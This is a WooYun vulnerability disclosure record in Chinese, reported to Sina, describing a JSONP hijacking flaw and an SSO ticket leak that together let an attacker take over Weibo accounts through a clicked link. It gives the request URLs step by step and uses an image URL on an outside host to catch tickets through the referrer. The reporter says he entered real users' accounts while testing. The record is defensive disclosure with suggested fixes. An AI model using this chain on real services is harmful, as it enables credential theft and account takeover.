{"id": 4625, "wybug_id": "wooyun-2015-0124352", "wybug_title": "微博上你点我发的链接我就可以登上你的微博（web版和app端均可两个漏洞一并提交）", "wybug_corp": "新浪", "wybug_author": "呆子不开口", "wybug_date": "2015-07-03 16:23", "wybug_open_date": "2015-08-17 16:54", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["认证设计不合理"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-07-03：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-07-03：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-07-13：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-07-23：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-08-02：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-08-17：\t细节向公众公开  简要描述： 微博上你点我发的链接，我就可以登上你的微博，web版和app端均可，两个漏洞一并提交了 详细说明：  1、web版本的jsonp劫持漏洞：有jsonp劫持漏洞，未加token保护或referrer防护，导致登陆凭证可以被劫持盗取请求如下：\nhttp://passport.weibo.com/visitor/visitor?a=restore&cb=?&from=weibo&_rand=0.7968236310407519\n返回为：\nwindow.jQuery20004128351090475917_1435908276616 && jQuery20004128351090475917_1435908276616({\"retcode\":20000000,\"msg\":\"succ\",\"data\":{\"sub\":\"_2A254kkjiDeTxGedP6FYQ9yfLy12837j0qrDV8PUNbuNAMLW3bkW-T5Tf4xIGwbw1ENJOXIY7s81RMuA..\",\"subp\":\"0033Wr111111M725Ws9jqgMF99529P9D9W5Yup4wVFUgexyDVsUXQXzc5JpX5K2t\",\"alt\":\"ALT-M1111113OTcxMA==-1435908274-ja-8ACAC8646F99BDFA2921F77870850A34\",\"savestate\":365}});\n里面的返回值alt可以用作登陆凭证，我扶了扶镜框，发现用如下URL可以登陆到目标用户的微博\nhttp://login.sina.com.cn/sso/login.php?entry=sso&alt=ALT-MTEz111111cxMA==-1435908274-ja-8ACAC8646F99BD111111F77870850A34&returntype=META&url=http%3A%2F%2Fweibo.com%2F&gateway=1&savestate=365\n里面的sub,subp值应该是认证的cookie值，应该也可以拿来利用2、微博app版的一些导致登陆凭证被盗的“小漏洞”当手机端访问如下请求时，系统会把当前sina.com.cn域下的ticket传给参数r中的url，r的值需要是weibo和新浪域\nhttp://passport.weibo.cn/sso/getst?r=http%3A%2F%2Fservice.weibo.com%2Fshare%2Fshare.php%3Furl%3D%26source%3Dbookmark%26title%3D分享网络超时，请重新分享%26appkey%3D%257B-1%257D%26pic%3Dhttp%3A%2F%2F111.111.111.111%2Ftest%2Fimg.php&service=blog\n上面的请求会返回302跳转到参数r中的url值，而且会加上一个参数ticket\nLocation: http://service.weibo.com/share/share.php?url=&source=bookmark&title=分享网络超时，请重新分享&appkey=%7B-1%7D&pic=http://111.111.111.111/test/img.php&ticket=ST-MTEzNDE3OTcxMA==-1435909414-gz-B57537411111111F64108F5B681E7F77\n然后我们要做的就是拿到这个url中的参数ticket就可以了由于是新浪或微博域，不能受我们控制，所以我们可以找一个可以让我们自定义img或者iframe的新浪页面来偷我扶了扶镜框，发现了一个，是微博分享页面，里面的pic参数可以让我们自定义图片地址\nhttp://service.weibo.com/share/share.php?url=&source=bookmark&title=%E5%88%86%E4%BA%AB%E7%BD%91%E7%BB%9C%E8%B6%85%E6%97%B6%EF%BC%8C%E8%AF%B7%E9%87%8D%E6%96%B0%E5%88%86%E4%BA%AB&appkey=%7B-1%7D&pic=http://192.241.226.89/test/wbimg.php\n这样从我们的自定义的图片请求的referrer中拿到这个ticket然后找一个能接受ticket的页面来帮我们种下sina.com.cn的认证cookie扶了扶镜框，发现一个\nhttp://c.blog.sina.com.cn/mobilecblog.php?ticket=ST-MTEzNDE3OTcxMA==-1435910399-gz-92197ADE4256E1111112D7A4F3469E3\n这个时候还不可以登陆微博，但我扶了扶镜框，发现访问如下url，可以帮我们成功登陆微博\nhttp://login.sina.com.cn/sso/login.php?url=http%3A%2F%2Fweibo.com%2F&_rand=1435226672.7914&gateway=1&service=sinawap&entry=sinawap&useticket=1&returntype=META&_client_version=0.6.11\n这一系列的不合理设计的“小漏洞”，让我最终可以登陆进了别人的微博   漏洞证明：  我测试了几天，进了些TFboys粉丝的微博\n\n   修复方案：  1.jsonp那个，加token或referrer限制2.认证传输过程中，尽量不要使用get来传输凭证，很容易被各种方式偷去。你不能保证你的所有域都不往第三方发请求3.让偷到的ticket尽量不能在其他设备上登陆成功，对用户的一些信息进行签名   版权声明：转载请注明来源 呆子不开口@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2015-07-03 16:52 厂商回复： 感谢关注新浪安全，安全问题修复中。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-07-03 16:27 |    \t\t90Snake \t\t\t( 普通白帽子  |\t\t\t        Rank:109 漏洞数:42        | 最大的漏洞就是人)\t\t \n  火钳刘明    \n     2015-07-03 16:27 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  呆子又扶眼镜框了    \n     2015-07-03 16:28 |    \t\tniliu  \t\t\t( 核心白帽子 |\t\t\t        Rank:1542 漏洞数:206        | 逆流而上)\t\t \n  屌！    \n     2015-07-03 16:28 |    \t\tfuzz-ing \t\t\t( 普通白帽子  |\t\t\t        Rank:104 漏洞数:21        | 闭关半年)\t\t \n  留名关注    \n     2015-07-03 16:29 |    \t\tsecer \t\t\t( 路人 |\t\t\t        Rank:5 漏洞数:2        | 来乌云学习学习)\t\t \n  昨晚某哥已中枪    \n     2015-07-03 16:32 |    \t\t90Snake \t\t\t( 普通白帽子  |\t\t\t        Rank:109 漏洞数:42        | 最大的漏洞就是人)\t\t \n  @呆子不开口 快去点草老公    \n     2015-07-03 16:34 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  @呆子不开口 因其中一个经典的漏洞给精华了，呆子教会了我应该如何耐心的分析业务也许，用心利用。    \n     2015-07-03 16:35 |    \t\t咸鱼翻身 \t\t\t( 普通白帽子  |\t\t\t        Rank:576 漏洞数:108        )\t\t \n  我去。。。。闪电侠    \n     2015-07-03 16:37 |    \t\t浅蓝 \t\t\t( 普通白帽子  |\t\t\t        Rank:274 漏洞数:109        | 爱安全:www.ixsec.orgXsec社区:zone.ixse...)\t\t \n  留名    \n     2015-07-03 16:38 |    \t\tloli  \t\t\t( 普通白帽子  |\t\t\t        Rank:550 漏洞数:52        )\t\t \n  赶紧公开啊。    \n     2015-07-03 16:41 |    \t\tJumbo \t\t\t( 普通白帽子  |\t\t\t        Rank:111 漏洞数:29        | 猫 - http://www.chinabaiker.com)\t\t \n  有点吊    \n     2015-07-03 16:42 |    \t\txtnnd \t\t\t( 普通白帽子  |\t\t\t        Rank:180 漏洞数:43        )\t\t \n  好文艺    \n     2015-07-03 16:57 |    \t\t大大灰狼 \t\t\t( 普通白帽子  |\t\t\t        Rank:248 漏洞数:53        | Newbie)\t\t \n  发个链接我看看    \n     2015-07-03 17:06 |    \t\tcmyk \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        )\t\t \n  前排    \n     2015-07-03 17:16 |    \t\t甲鱼 \t\t\t( 路人 |\t\t\t        Rank:28 漏洞数:3        | 慢慢爬……)\t\t \n  发个链接我看看    \n     2015-07-03 17:32 |    \t\t进击的zjx \t\t\t( 普通白帽子  |\t\t\t        Rank:295 漏洞数:61        | 工作需要，暂别一段时间)\t\t \n  屌屌屌    \n     2015-07-03 17:35 |    \t\t呆子不开口 \t\t\t( 普通白帽子  |\t\t\t        Rank:324 漏洞数:25        | 求各种兼职)\t\t \n  @secer 什么意思，别人也有这个洞？    \n     2015-07-03 17:53 |    \t\tMieless \t\t\t( 路人 |\t\t\t        Rank:11 漏洞数:1        | 我是来打酱油的。)\t\t \n  大屌     \n     2015-07-03 18:21 |    \t\tBear baby \t\t\t( 普通白帽子  |\t\t\t        Rank:183 漏洞数:20        | 善攻者，不知其所守。善守者，不知其所攻。)\t\t \n  偶像    \n     2015-07-03 18:37 |    \t\tsutdy \t\t\t( 普通白帽子  |\t\t\t        Rank:101 漏洞数:33        | 0.0)\t\t \n  请收下我的膝盖    \n     2015-07-03 19:50 |    \t\t秋风 \t\t\t( 普通白帽子  |\t\t\t        Rank:438 漏洞数:44        | 码农一枚，关注互联网安全)\t\t \n  NB!    \n     2015-07-03 21:05 |    \t\t子非海绵宝宝  \t\t\t( 核心白帽子 |\t\t\t        Rank:1044 漏洞数:106        | 发扬海绵宝宝的精神!你不是海绵宝宝,你怎...)\t\t \n  再一次?    \n     2015-07-03 22:07 |    \t\t一只船北街 \t\t\t( 普通白帽子  |\t\t\t        Rank:418 漏洞数:60        | 闭馆研习技术中...)\t\t \n  我以为回到了2014年...    \n     2015-07-03 23:50 |    \t\t疯狂的dabing \t\t\t( 实习白帽子  |\t\t\t        Rank:33 漏洞数:9        | Hehe is golden.)\t\t \n  伟哥又猥琐了。。。    \n     2015-07-04 00:13 |    \t\t小龙 \t\t\t( 普通白帽子  |\t\t\t        Rank:1208 漏洞数:316        | 乌云有着这么一群人，在乌云学技术，去某数...)\t\t \n  不会又是二维码吧    \n     2015-07-06 11:25 |    \t\t屎蛋 \t\t\t( 路人 |\t\t\t        Rank:8 漏洞数:2        | boom)\t\t \n  666    \n     2015-07-13 18:26 |    \t\tniliu  \t\t\t( 核心白帽子 |\t\t\t        Rank:1542 漏洞数:206        | 逆流而上)\t\t \n  眼镜哪买的好屌    \n     2015-07-14 00:22 |    \t\t鸟云厂商  \t\t\t( 核心白帽子 |\t\t\t        Rank:1313 漏洞数:146        | 中国菜鸟)\t\t \n  给我来个镜框扶一扶    \n     2015-07-15 11:44 |    \t\tmilan \t\t\t( 普通白帽子  |\t\t\t        Rank:129 漏洞数:32        | 妈妈说：搬不完砖就别回家。)\t\t \n  牛逼    \n     2015-07-15 12:19 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  现在的都那么牛，唉，跟不上时代了    \n     2015-08-06 13:12 |    \t\thkAssassin \t\t\t( 普通白帽子  |\t\t\t        Rank:358 漏洞数:66        | 我是一只毛毛虫。)\t\t \n  我扶了扶镜框觉嘚你是我偶像！    \n     2015-08-17 18:16 |    \t\tscanf \t\t\t( 核心白帽子 |\t\t\t        Rank:1232 漏洞数:186        | 。)\t\t \n  最后眼镜框掉了没有    \n     2015-08-17 18:37 |    \t\tAnnabelle \t\t\t( 实习白帽子  |\t\t\t        Rank:46 漏洞数:15        | .)\t\t \n  我们家马桶堵了，谁知道掏粪男孩的电话？在线等，挺急的[doge]    \n     2015-08-18 16:12 |    \t\t野驴~ \t\t\t( 路人 |\t\t\t        Rank:5 漏洞数:2        | 充满强烈好奇心的菜鸟。)\t\t \n  妈妈问我为什么跪着看乌云……    \n     2015-08-18 23:06 |    \t\t刘海哥 \t\t\t( 普通白帽子  |\t\t\t        Rank:114 漏洞数:28        | 索要联系方式但不送礼物的厂商定义为无良厂...)\t\t \n  眼镜我准备买了！    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}